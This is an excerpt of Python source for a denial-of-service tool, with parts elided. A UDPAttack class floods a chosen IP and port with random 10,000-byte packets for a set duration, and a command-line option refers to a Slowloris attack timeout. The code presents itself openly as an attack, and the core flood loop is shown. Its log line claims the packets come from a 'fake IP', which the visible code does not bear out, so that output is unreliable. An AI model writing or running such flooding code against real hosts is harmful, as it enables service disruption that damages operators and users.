...
class UDPAttack:
    def __init__(self, target_ip, port, sleep , duration):
        self.target_ip = target_ip
        self.port = port
        self.sleep = sleep
    ...
    def attack(self):
        ...
        while time.time() < end_time:
            try:
                self.s.sendto(random.randbytes(10) * 1000, (self.target_ip, self.port))
                packet_count += 1
                print(f"Sent {packet_count} packet to {self.target_ip} through port {self.port} from fake IP {self._fake_ip()}")
...
if __name__ == "__main__":
    ...
    parser.add_argument('--to', type=int, default=20, help='Timeout for Slowloris attack (in seconds, default: 20)')
